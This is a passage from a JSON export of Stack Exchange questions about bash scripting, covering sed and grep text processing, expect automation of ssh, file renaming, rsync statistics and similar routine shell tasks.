12300;\n</code></pre>\n"},{"tags":["bash","terminal","osx-lion",".bash-profile"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12496676,"title":"Bash - Set a default prompt","body":"<p>I've set a bash prompt like this:</p>\n\n<pre><code>PS1='\\W\\[\\e[31m\\]$(git branch &amp;&gt;/dev/null; if [ $? -eq 0 ]; then \\\n  echo \" $(git branch | grep '^*' |sed s/\\*\\ //)\"; fi)'\n</code></pre>\n\n<p>I want to make it default in order not to enter it every time I open the terminal. \n(I'm using OSX lion / Terminal Version 2.2.1)</p>\n\n<hr>\n\n<p><strong>Solution:</strong> I put the PS1=... line in ~/.bash_profile as Hai Vu suggested.</p>\n\n<p>Thank you all for your answers</p>\n"},{"tags":["linux","bash","unix","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":84,"score":4,"question_id":12521668,"title":"Regarding grep command","body":"<p>I am trying to change the copyright headers in my assignment. I was able to list all the files with the copyright headers by using following commmand:</p>\n\n<pre><code>    grep -rni copyright *\n</code></pre>\n\n<p>By the above command, I got around 1000 files.</p>\n\n<p>Can anyone please help me how to change all the files in one go?</p>\n"},{"tags":["bash","unix","sed","awk","grep"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":12508923,"title":"Find and remove DOS line endings on Ubuntu","body":"<p>I have found that many of my files have DOS line endings.   In VI they look like this: \"^M\".\nI don't want to modify files that don't have these DOS line endings.  How do I do this using a bash script?  Thanks!</p>\n\n<p>EV</p>\n"},{"tags":["bash","bash-completion"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12466013,"title":"bash completion for teamocil","body":"<p>I'm trying to define bash auto-completion for <a href=\"http://remiprev.github.com/teamocil/\" rel=\"nofollow\">teamocil</a> so that when I type <code>teamocil &lt;tab&gt;</code> it should complete with the file names in the folder <code>~/.teamocil/</code> without the file extensions. There's an example for <code>zsh</code> in the website:</p>\n\n<pre><code>compctl -g '~/.teamocil/*(:t:r)' teamocil\n</code></pre>\n\n<p>how can I use this in <code>bash</code>?</p>\n\n<p><strong>Edit:</strong> Influenced by michael_n 's answer I have come up with a one-liner:</p>\n\n<pre><code>complete -W \"$(teamocil --list)\" teamocil\n</code></pre>\n"},{"tags":["linux","bash","shell","unix","nfs"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":320,"score":2,"question_id":9159839,"title":"bash checking directory existence hanging when NFS mount goes down","body":"<p>I have a .bash_profile script that sets up some aliases for me based on directory existence:</p>\n\n<pre><code>if [ -d  /home/user/games ] ; then\n  alias cdgames='cd /home/user/games'\nfi\n</code></pre>\n\n<p>One of these directory is on an NFS mount - if the filer becomes unresponsive <code>su - user</code> will hang on this line in .bash_profile.</p>\n\n<p>Is there any way to check existence of a directory in bash without causing a hang if the directory is mounted to an unresponsive filer?</p>\n"},{"tags":["php","html","bash"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12521256,"title":"Bash: recursively find php files, preprocess with php, capture output to html files","body":"<p>I'm looking to scan a directory for files named *.php, and then execute each one with the PHP preprocessor, and capture the output to the same location as the file, with the same filename, only .html extension instead of .php.</p>\n\n<p>so far I have: </p>\n\n<pre><code>find . -type f -name \"*.php\" | xargs -I {} php {} &gt;&gt; '{ dirname {}; basename {} .php; }'\n</code></pre>\n\n<p>thanks for your help on this bash puzzle !</p>\n"},{"tags":["git","bash","symlink"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12519510,"title":"How do a source a file via symlink in git alias?","body":"<p>I have a file that I want to source for a git alias. However, git doesn't seem to follow symlinks. When using the following config (where ~/.githelpers is a symlink):</p>\n\n<pre><code># .gitconfig\n[alias]\n  test = \"!source ~/.githelpers &amp;&amp; my_function\"\n...\n\n# in the terminal I get\n&gt; git test\n-&gt; source ~/.githelpers: 1: source ~/.githelpers: source: not found\n-&gt; fatal: While expanding alias 'test': 'source ~/.githelpers': No such file or directory\n</code></pre>\n\n<p>Any ideas how to resolve this?</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>using</p>\n\n<pre><code>[alias]\n  test = \"!source ~/.githelpers &amp;&amp; my_function\"\n</code></pre>\n\n<p>results in</p>\n\n<pre><code>Using source `readlink ~/.githelpers`: 1: source `readlink ~/.githelpers`: source: not found\nfatal: While expanding alias 'test': 'source `readlink ~/.githelpers`': No such file or directory\n</code></pre>\n\n<p>Maybe it's not a symlink issue after all.</p>\n"},{"tags":["git","bash","replace","grep"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":38,"score":-1,"question_id":12519889,"title":"how to find and replace files from .gitignore in bash","body":"<p>i only found how to find strings in files but how can I replace commented lines and how exectly should i replace them?</p>\n\n<pre><code>#!/bin/sh\necho enter file name \nread fname \nexec&lt;$fname \n\nwhile read line \ndo\n    echo $line; \ndone \n</code></pre>\n"},{"tags":["bash","parsing","awk","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12520203,"title":"parsing file in bash","body":"<p>I have a output in a file and i want to parse the file line by line to just get the line with the \"ip address(10.113.193.70)\"  and the \"Version: 47.80.99.08\" to the standard output. What would be the best way to parse using grep/awk or bash?   </p>\n\n<pre><code>10.113.193.70\n\nExecuting (0,0,0,0,0,0,0,0,0,0):\n==== product information ====\nProduct: e10\nPackage: default\nVersion: 47.80.99.08\nType:    customer\nBuilder: symsm\nProject: RAID\n</code></pre>\n"},{"tags":["bash","printing","if-statement"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12519937,"title":"bash to print certain file names to text","body":"<p>I have spent a lot of time the past few weeks and posting on here.  I finally think I am much closer with learning bash but I have one problem with my code I cannot for the life of me figure out why it will not run.  I can run each line in the terminal and it returns a result but for some reason when I point it to run, it will do nothing.  I get a a syntax error: word unexpected (expecting \"do\").  </p>\n\n<pre><code>#!/bin/bash\n\nimage=\"/Home/Desktop/epubs/images\"\n\nfor f in $(ls \"$image\"*.jpg); do\n    fsize=$(stat --printf= '%s' \"$f\");\n    if [ \"$fsize\" -eq \"40318\" ]; then\n       echo \"$(basename $f)\" &gt;&gt; results.txt\n    fi\ndone\n</code></pre>\n\n<p>What am I missing???  </p>\n"},{"tags":["regex","bash","shell","brace-expansion"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":112,"score":1,"question_id":12503666,"title":"shell script input string with regular expression loop values","body":"<p>I want to be able to let a user type in :</p>\n\n<pre><code>./script.sh server[01-10]type\n</code></pre>\n\n<p>I have got this already working and works with [a-z] or [0-99] or however high numerically it goes. Although really unsure if I have gone about it all the right way and if there are easier ways of doing the same thing.</p>\n\n<p>Wanted to check if there was an easier way of doing something like this and how easy it would be to have multiple wild card inputs like:</p>\n\n<pre><code>./script.sh (server|web)[01-10][a-z]\n</code></pre>\n\n<p>where it would then parse for either web01-10a-z or server01-10a-z and list all servers.</p>\n\n<p>Here is what I have so far and admit I need to tidy it up but was thinking let me get it working better before focusing on tidier code calls.</p>\n\n<pre><code> #!/bin/bash\n input=$1;\n if [[ $input =~ \\[ ]];then\n     s=\"[\"\n     f=\"]\"\n     host_start=`echo $input|awk -F\"[\" '{print $1}'`\n     host_end=`echo $input|awk -F\"]\" '{print $2}'`\n     start=`awk -v a=\"$input\" -v b=\"$s\" 'BEGIN{print index(a,b)}'`\n     fin=`awk -v a=\"$input\" -v b=\"$f\" 'BEGIN{print index(a,b)}'`\n     vals=`expr $fin - $start`\n     ((start++))\n     ((vals--))\n     in1=`echo $input| awk -v s=$start -v f=$vals '{ print substr( $0, s($0),f($0) ) }'`\n     val1=`echo $in1|awk -F\"\\-\" '{print $1}'`\n     val2=`echo $in1|awk -F\"\\-\" '{print $2}'`\n     for index in $(eval echo {$val1..$val2})\n     do\n         server=\"$host_start$index$host_end\"\n         echo \"Current server: $server \"\n     done\nfi\n</code></pre>\n\n<p>When I execute this I get:</p>\n\n<pre><code>./run.bash apache[9-11]\nCurrent server: apache9 \nCurrent server: apache10 \nCurrent server: apache11 \n\n$ ./run.bash apache[f-k]\nCurrent server: apachef \nCurrent server: apacheg \nCurrent server: apacheh \nCurrent server: apachei \nCurrent server: apachej \nCurrent server: apachek \n\n$ ./run.bash apache[f-k]abc\nCurrent server: apachefabc \nCurrent server: apachegabc \nCurrent server: apachehabc \nCurrent server: apacheiabc \nCurrent server: apachejabc \nCurrent server: apachekabc \n</code></pre>\n\n<p><strong>UPDATED TO THANK EVERYONE</strong></p>\n\n<p>3 lines does all of above and handles all types I wanted here is how:</p>\n\n<pre><code>#!/bin/bash\nval=$1;\n\nvalue=`echo \"$val\"|sed 's:(:{:g; s:):}:g; s:|:,:g; s/^//;s/$//'`\nvalue=`echo \"$value\"|sed 's:\\[:{:g; s:\\]:}:g; s:-:\\.\\.:g; s/^//;s/$//'`\n(eval echo $value)\n\n./test-brace.sh \"(server|apache)[0-2][a-c]\"\nserver0a server0b server0c server1a server1b server1c server2a server2b server2c apache0a apache0b apache0c apache1a apache1b apache1c apache2a apache2b apache2c\n</code></pre>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12478561,"title":"bash: White-space in filenames","body":"<p>I've got a simple script:</p>\n\n<pre><code>#!/bin/sh\ncd /tmp/pics\nfor pic in *.jpg;\ndo\n  php -f /tmp/pics/covert.php $pic;\ndone\n</code></pre>\n\n<p>When my pictures have white-space in their names that script won't work. How could I fix that?</p>\n\n<p>How can I fix my script to handle whitespace properly, and also handle other JPEG extensions, such as \"JPG\", \"JPEG\", \"jpeg\"?</p>\n"},{"tags":["java","linux","bash","script"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12485552,"title":"how to integrate Bash with Java","body":"<p>Can any body help me with how to compile a bash script as part of a java program. I am writing a simple java program that i want to use to invoke bash script commands.</p>\n\n<hr>\n\n<p>my java code looks like the following:</p>\n\n<pre><code>    try{\n            Process p = Runtime.getRuntime().exec(\"myscript.sh\"); \n        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); \n\n        String line = null;  \n\n        while ((line = in.readLine()) != null){  \n                    System.out.println(line); \n        }  \n    }\n    catch(IOException e){\n        System.out.println(e.getMessage());\n    }\n</code></pre>\n\n<p>and the \"mysrcipt.sh\" file is a simple script that contains the following lines</p>\n\n<hr>\n\n<h1>!/bin/bash</h1>\n\n<p>echo \"enter your input followed by [ENTER]:\"</p>\n\n<p>read -e choice</p>\n\n<p>echo $choice</p>\n\n<hr>\n\n<p>My problem is, the program waits for an input at the read command in the script even if i enter multiple lines and press enter several times.</p>\n"},{"tags":["bash","automation","automated-tests","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12514336,"title":"use expect to automate the piped command","body":"<p>I want to automate a piped command <code>cat ~/.ssh/id_rsa.pub | ssh root@host 'cat &gt;&gt; .ssh/authorized_keys'</code> in <code>expect</code>. When using <code>spawn</code> command to execute the command, </p>\n\n<pre><code>spawn cat ~/.ssh/id_rsa.pub | ssh root@host 'cat &gt;&gt; .ssh/authorized_keys' \n</code></pre>\n\n<p>it throws error msg, </p>\n\n<pre><code>cat |: No such file or directory\ncat ssh: No such file or directory\n...\n</code></pre>\n\n<p>How should I spawn the piped commands?</p>\n"},{"tags":["bash","automation","automated-tests","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":118,"score":0,"question_id":12518354,"title":"use expect to spawn command with arguments containing spaces","body":"<p>I want to use <code>expect</code> to run a simple command <code>cat /tmp/id_rsa.pub</code> over ssh.</p>\n\n<p>In a shell, I can run this wo problem, (with manually put in the password)</p>\n\n<pre><code>ssh root@localhost 'cat /tmp/id_rsa.pub'\n</code></pre>\n\n<p>I want to automate this with <code>expect</code>. My <code>expect</code> script is,</p>\n\n<pre><code>#!/usr/bin/expect\neval spawn ssh root@localhost 'cat /tmp/id_rsa.pub'\nexpect \"password:\"\nsend \"123456\"\nexpect eof\n</code></pre>\n\n<p>It throws error <code>bash: cat /tmp/id_rsa.pub: no such file or directory</code>. it looks very strange to me. What could be the possible cause?</p>\n\n<p>Edit: after some testing, I find this is common, not only in the case of <code>cat</code>. If the argument to spawned command is with space (even if it's in the quotes), it will have problem. For example, replacing <code>cat /tmp/id_rsa.pub</code> with other commands with spaces, like </p>\n\n<pre><code>eval spawn ssh root@localhost 'which java'\n</code></pre>\n\n<p>it complains with <code>bash: which java: command not found</code>. But if replacing that with <code>pwd</code>, like </p>\n\n<pre><code>eval spawn ssh root@localhost 'pwd'\n</code></pre>\n\n<p>it work fine.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12518390,"title":"Bash script for summary statistics","body":"<p>I have a <code>csv</code> file of customer data and I'd like to find the probability that they buy a product based on past behavior.  </p>\n\n<p>The table looks like this:</p>\n\n<pre><code>custId         prodId       purchased\n   001           0001          0\n   002           0001          0\n   006           1001          1\n   001           0501          0\n   012           8001          0\n   189           0071          0\n   487           0001          1\n   ...           ...          ...\n</code></pre>\n\n<p><code>custId</code> is the customer id, <code>prodId</code> is the product, neither column is unique nor is <code>custId-prodId</code> unique as a customer can be shown the same product multiple times.</p>\n\n<p>The ideal output would be something like:</p>\n\n<pre><code> custId         purchased\n   001           .0999\n   002           0\n   006           1\n   012           0\n   189           .75\n   487           1\n   ...          ...   \n</code></pre>\n\n<p>I'm looking at doing this in <code>bash</code> as the file is too large to fit in memory.</p>\n\n<p>Any suggestions?      </p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12505676,"title":"Script to Monitor IPMI SEL in real time","body":"<p>I want to monitor IPMI System Event Log(SEL) in real time. What I want that is that whenever a event is generated in SEL , automatically a mail alert should be generated .</p>\n\n<p>One way for me to achieve this is that I can write a script and schedule it in cron. The script will run 3 or 4 times a day so whenever a new event is generated , a mail alert will be send to me.</p>\n\n<p>I want the monitoring to be active. Like whenever a event is generated , a mail should be sent to me instead of checking at regular intervals. </p>\n\n<p>The SEL Log format is as follows: </p>\n\n<p>server-001% sudo ipmitool sel list</p>\n\n<p>b4 | 05/27/2009 | 13:38:32 | Fan #0x37 | Upper Critical going high  </p>\n\n<p>c8 | 05/27/2009 | 13:38:35 | Fan #0x37 | Upper Critical going high  </p>\n\n<p>dc | 08/15/2009 | 07:07:50 | Fan #0x37 | Upper Critical going high  </p>\n\n<p>So , for the above case whenever a new event is generated , automatically a mail alert should be send to me with the event. \nHow can I achieve this with a bash script . Any pointers will be highly appreciated. </p>\n"},{"tags":["linux","bash","shell","hexadecimal-notation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12511762,"title":"How to represent hexadecimal number with two digits in linux scripts (bash)","body":"<p>I have a problem.\nI must represent each number with exactly 2 digits (i.e. 0F instead of F)</p>\n\n<p>my code looks something like that:<br>\n1. read number of ascii chars are in an environment variable (using wc -w)<br>\n2. converting this number to hexadecimal (using bc).</p>\n\n<p>How can I make sure the number I'll get after stage 2 will include a leading 0 (if necessary)</p>\n\n<p>Thanks,\nAmigal </p>\n"},{"tags":["version-control","login-script","bash"],"answer_count":10,"favorite_count":30,"up_vote_count":51,"down_vote_count":0,"view_count":26944,"score":51,"question_id":394230,"title":"Detect the OS from a Bash script","body":"<p>I would like to keep my <code>.bashrc</code> and <code>.bash_login</code> files in version control so that I can use them between all the computers I use. The problem is I have some OS specific aliases so I was looking for a way to determine if the script is running on Mac&nbsp;OS&nbsp;X, Linux or <a href=\"http://en.wikipedia.org/wiki/Cygwin\">Cygwin</a>.</p>\n\n<p>What is the proper way to detect the operating system in a <a href=\"http://en.wikipedia.org/wiki/Bash_%28Unix_shell%29\">Bash</a> script?</p>\n"},{"tags":["bash","shell","ksh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12513830,"title":"replace special charaters in a string with escape sequence in shell programing","body":"<p>I have script file which replaces one word with other in files .</p>\n\n<p>this is piece of code I use .now the problem I face is when Var1 and Var2 are path names .I m pretty new to shell scripting .I know i should put a escape sequence in front .since var1 and var2 are read from csv files i cant manually put escape sequences on them .is ther a way to detect  the special charaters before this command and replace them with escape sequence </p>\n\n<p>$f is a file name</p>\n\n<pre><code>sed -i \"s/$Var1/$Var2/g\" \"$f\"\n</code></pre>\n"},{"tags":["bash","rsync"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12511636,"title":"Converting rsync --stats output to GB?","body":"<p>When using <code>--stats</code> with rsync, you get a report at the bottom of the transfer log.</p>\n\n<pre><code>Number of files: 211009\nNumber of files transferred: 410\nTotal file size: 903119614118 bytes\nTotal transferred file size: 9046197739 bytes\nLiteral data: 0 bytes\nMatched data: 0 bytes\nFile list size: 5864077\nFile list generation time: 23.204 seconds\nFile list transfer time: 0.000 seconds\nTotal bytes sent: 5865513\nTotal bytes received: 1441\n</code></pre>\n\n<p>I would like to convert <code>Total file size</code> and <code>Total transferred file size</code> in place to GB, so it becomes</p>\n\n<pre><code>Number of files: 211009\nNumber of files transferred: 410\nTotal file size: 903 GB\nTotal transferred file size: 9 GB\nLiteral data: 0 bytes\nMatched data: 0 bytes\nFile list size: 5864077\nFile list generation time: 23.204 seconds\nFile list transfer time: 0.000 seconds\nTotal bytes sent: 5865513\nTotal bytes received: 1441\n</code></pre>\n\n<p><strong>Question</strong></p>\n\n<p>How should that be done?</p>\n"},{"tags":["bash","script","automation","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12512545,"title":"use expect to automate ssh keypair generation","body":"<p>I want to automate command <code>ssh-keygen -t rsa</code>. What's unique is the command will print out different text under different conditions. For example, if it is the first time, it will output <code>enter passphrase</code> and <code>enter passphrase again</code>. otherwise, it will prompt with <code>Overwrite (y/n):</code>. How to handle this in <code>expect</code>.</p>\n\n<p>I have tried using pattern action pair, like</p>\n\n<blockquote>\n  <p>expect \"enter passphrase\" {send \"\\r\"} \\</p>\n\n<pre><code>   \"Overwrite (y/n): \" {send \"n\\r\"}\n</code></pre>\n</blockquote>\n\n<p>However, it only handles one prompt at a time; how can I handle the prompt <code>enter passphrase again</code>?</p>\n"},{"tags":["bash","readline","bash-alias"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12510506,"title":"Masking user input & encoding","body":"<p>I wish to create a simple bash alias due to the amount of options &amp; switches this particular set of functions requires. This is the background info and NOT the problem.</p>\n\n<p>To perform the command in question requires a passphrase (often in multiple locations) which I would like to minimize and provide some privacy from other users at the same time.</p>\n\n<p>Here is the alias example...</p>\n\n<pre><code>alias test=\"read -sp 'Enter passphrase: ' pass; gpg --batch --passphrase $pass --symmetric --cipher-algo aes256 -o file.ext.gpg file.ext\"\n</code></pre>\n\n<p>The alias works fine, prompts the user to enter a passphrase and applies it to the decryption process.</p>\n\n<p>THIS IS THE PROBLEM:\nIf I encrypt the file and enter a passphrase (without using the read -sp utlity as shown in the above example) the encrypted files password is different than if I use the 'read' binary to mask the input.</p>\n\n<p>If I display the contents of $pass that was captured with read -sp it displays just as I typed it without any additional line endings etc.</p>\n\n<p>Anyone experience this?</p>\n"},{"tags":["file","bash","ant","rename","batch-processing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12511978,"title":"Rename files in a directory based on other directory","body":"<p>I'm having several outputs of a program that I need to compare with a \"expected\" ouput folder. But my problem is that the output files always have a different filename. </p>\n\n<p>How can I rename all files in a folder to the same filenames in another folder. Here the example - the expected file structure (can of course change):</p>\n\n<pre><code>expected/folder1/file1.txt\nexpected/folder1/file2.txt\nexpected/folder2/file1.txt\nexpected/folder3/file1.txt\n</code></pre>\n\n<p>And my output looks like this (number of files and position is always equal):</p>\n\n<pre><code>result/folder1/fileOtherName1.txt\nresult/folder1/fileOtherName2.txt\nresult/folder2/fileOtherName1.txt\nresult/folder3/fileOtherName1.txt\n</code></pre>\n\n<p>I tried using ANT (because I know that), but was stuck, because I cannot select a file by the index (sorted alphabetically).</p>\n\n<p>Here my pseudocode in ANT (but don't know how to continue):</p>\n\n<pre><code>&lt;target name=\"foo\"&gt;\n    &lt;foreach&gt;\n        &lt;fileset dir=\"result\" casesensitive=\"yes\"&gt;\n            &lt;include name=\"**/*.txt\"/&gt;\n        &lt;/fileset&gt;\n        &lt;antcall target=\"rename\"&gt;\n        &lt;/antcall&gt;\n    &lt;/foreach&gt;\n&lt;/target&gt;\n\n&lt;target name=\"rename\"&gt;\n    &lt;!-- how can I access another fileset and take the correct file? --&gt;\n    &lt;!-- Here I got stuck --&gt;\n    &lt;echo message=\"foreach.file is ${foreach.file}\" /&gt;\n    &lt;echo message=\"foreach.dir is ${foreach.dir}\" /&gt;\n    &lt;echo message=\"foreach.name.ext is ${foreach.name.ext}\" /&gt;\n    &lt;echo message=\"foreach.name is ${foreach.name}\" /&gt;\n&lt;/target&gt;\n</code></pre>\n\n<p>Thanks for any help, it must not be in <strong>ANT</strong> only - a <strong>BASH</strong> script or similar could do the job too.</p>\n"},{"tags":["bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":12494334,"title":"Inserting quotes to pipe separated line using sed","body":"<p>I have a custom made tool that  parses XML files using SAX and that reproduces them into pipe separated values, an example of a line would be:</p>\n\n<pre><code>name|lastname|address|telephone|age|other info|other info\n</code></pre>\n\n<p>I would like to rewrite each line, i will do this using a bash script but i'm having some difficulties.\nBasically i would like to set each word between quotes, an example for the above line would be:</p>\n\n<pre><code>\"name\"|\"lastname\"|\"address\"|\"telephone\"|\"age\"|\"other info\"|\"other info\"\n</code></pre>\n\n<p>i'm trying to do this using sed, and i'm partially successful with this sed line</p>\n\n<pre><code>sed 's:|:\"|\":g'\n</code></pre>\n\n<p>as i get the output:\nname\"|\"lastname\"|\"address\"|\"telephone\"|\"age\"|\"other info\"|\"other info</p>\n\n<p>but i dont know how to set quotes for the first char and the last char,\nAny advice?</p>\n"},{"tags":["git","bash"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1151,"score":2,"question_id":3497123,"title":"Run git pull over all subdirectories","body":"<p>How can I run</p>\n\n<pre><code>git pull origin master\n</code></pre>\n\n<p>on all sub directories of a directory.</p>\n\n<p>I.E.</p>\n\n<p>I have </p>\n\n<pre><code>/plugins/cms\n/plugins/admin\n/plugins/chart\n</code></pre>\n\n<p>etc and I want to update them all at the same time.</p>\n\n<p>(Im running debian linux)</p>\n"},{"tags":["linux","bash","shell","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":105,"score":0,"question_id":12511895,"title":"Curl \"write out\" value of specific header","body":"<p>I am currently writing a bash script and I'm using curl. What I want to do is get one specific header of a response.</p>\n\n<p>Basically I want this command to work:</p>\n\n<pre><code>curl -I -w \"%{etag}\" \"server/some/resource\"\n</code></pre>\n\n<p>Unfortunately it seems as if the -w, --write-out option only has a set of variables it supports and can not print any header that is part of the response. Do I need to parse the curl output myself to get the ETag value or is there a way to make curl print the value of a specific header?</p>\n\n<p>Obviously something like</p>\n\n<pre><code>curl -sSI \"server/some/resource\" | grep 'ETag:' | sed -r 's/.*\"(.*)\".*/\\1/'\n</code></pre>\n\n<p>does the trick, but it would be nicer to have curl filter the header. </p>\n"},{"tags":["regex","linux","bash","sed","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12509150,"title":"How to use sed to print the match patten","body":"<p>i want to use sed to print the match patten, for example:<br>\ni want to get the uuid , so i can use this :<br>\n<code>blkid $1 | grep -o -E \"[a-f0-9-]{8}([a-f0-9-]{4}){3}[a-f0-9-]{12}\"</code><br>\nHow can i do this use sed or awk ?</p>\n"},{"tags":["bash","redirect","stdout"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1865,"score":1,"question_id":3890809,"title":"Bash, stdout redirect of commands like scp","body":"<p>I have a bash script with some scp commands inside.\nIt works very well but, if I try to redirect my stdout with \"<strong>./myscript.sh >log</strong>\", only my explicit echos are shown in the \"log\" file.\nThe scp output is missing.</p>\n\n<pre><code>if $C_SFTP; then\n   scp -r $C_SFTP_USER@$C_SFTP_HOST:$C_SOURCE \"$C_TMPDIR\"\nfi\n</code></pre>\n\n<p>Ok, what should I do now?\nThank you</p>\n"},{"tags":["linux","bash","shell","sh","csh"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12510829,"title":"What is the best way to identify which syslog daemon is running on Linux?","body":"<p>I'm writing Linux shell script (sh, bash or csh) to identify which syslog daemon is running.\nWhat is the best way to do it?\nSince I only consider RHEL and rpm based destribution, Debian and its derivatives can be ignored.</p>\n"}]}
{"total":16352,"page":19,"pagesize":100,"questions":[{"tags":["python","linux","bash","shell","process"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12508540,"title":"attatch existing process for sucess or fail commands?","body":"<p>In Bash we can run programs like this</p>\n\n<p><code>./mybin &amp;&amp; echo \"OK\"</code></p>\n\n<p>and this</p>\n\n<p><code>./mybin || echo \"fail\"</code></p>\n\n<p>But how do we attach success or fail commands to existing process?</p>\n\n<p><strong>Edit for explaination</strong>:</p>\n\n<p>Now we are running <code>./mybin</code> .</p>\n\n<p>When <code>mybin</code> exits with or without error it will do nothing, but during <code>mybin</code> is running, \n how can I achieve the same effect like I started the process like <code>./mybin &amp;&amp; echo ok || echo fail</code> ?</p>\n\n<p>In both shell script and python programming way would be awesome, thanks!</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":3626633,"title":"shell script + $? as deafult 1 in the beginning","body":"<p>I have the following (part of big ksh script)</p>\n\n<pre><code> while [[ $? -ne 0 ]]\n  do\n\n    print -n \"ENTER VALID HOST IP\"\n     read IP\n     CHECK_IP $IP   # CHECK_IP is afuntion that check if IP is valid and return 0 or 1\n     done\n</code></pre>\n\n<p>as we see in the while the $? is always equal to 0\nso we cant ask for the IP</p>\n\n<p>the target of the loop is to ask IP address \nand  activate CHECK_IP function in order to return 0 or 1</p>\n\n<p>0 for valid IP</p>\n\n<p>1 for BAD IP</p>\n\n<p>but as I said in the begging I never asked about IP because $? always 0 (after \"while\" )</p>\n\n<p>so my question</p>\n\n<p>How to enable default 1 to $? so I will start the loop , or other suggestion?</p>\n\n<p>lidai</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":104,"score":-1,"question_id":9951655,"title":"Variable arguments to a shell script","body":"<p>I would like  to have my script accepting variable arguments. How do I check for them individually? </p>\n\n<p>For example</p>\n\n<pre><code>./myscript arg1 arg2 arg3 arg4\n\n or \n\n./myscript arg4 arg2 arg3\n</code></pre>\n\n<p>The arguments can be any number and in any order. I would like to check if arg4 string is present or not irrespective of the argument numbers. </p>\n\n<p>How do I do that? </p>\n\n<p>Thanks,</p>\n"},{"tags":["perl","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12508076,"title":"Sort any random list of files by modification date","body":"<p>Looking for generic way how to sort a random list of files by its modification time, so something like:</p>\n\n<pre><code>./make_list_of_files | some_sorter_by_mtime\n</code></pre>\n\n<p>my currect solution is (here the <code>make_list_of_files</code> is the <code>find</code> command):</p>\n\n<pre><code>find / -type f -print |\\\n  perl -nle 'push @in,$_;END {@out = sort{ (stat($a))[9] &lt;=&gt; (stat($b))[9] } @in; $,=\"\\n\";print @out}'\n</code></pre>\n\n<p>exists some simpler solution (e.g. without perl)?</p>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12507803,"title":"get a bash's cwd","body":"<p>If I open up 2 terminals in Ubuntu, via <code>ps u</code> I can see 2 <code>bash</code>'s <code>pid</code>.</p>\n\n<p>My problem is from one terminal, how can I know the <code>bash</code>'s <em>cwd</em> in the other terminal?</p>\n"},{"tags":["bash","shell","script"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12494208,"title":"Rename files depending on age","body":"<p>I have a script</p>\n\n<pre><code>for d in $(find /home/users/*/personal/*/docs/MY -type d); do\n    find $d -maxdepth 1 -type f -amin -10\ndone\n</code></pre>\n\n<p>It will list all files in MY directory created in period of 10 minutes in Linux server. I am looking for a way how to do that all these searched files matching criterias will be renamed by adding prefix old_. I mean if script finds files <code>aaaa</code> and <code>bbbb</code>, then renames them to <code>old_aaa</code> and <code>old_bbbb</code>. </p>\n\n<p>Could someone help me?</p>\n"},{"tags":["bash","variables","cat"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12508059,"title":"adding a number to a variable","body":"<p>I am trying to get the contents of a txt file \"usernum.txt\", get the contents, add one to that number, and replace the current number with the new 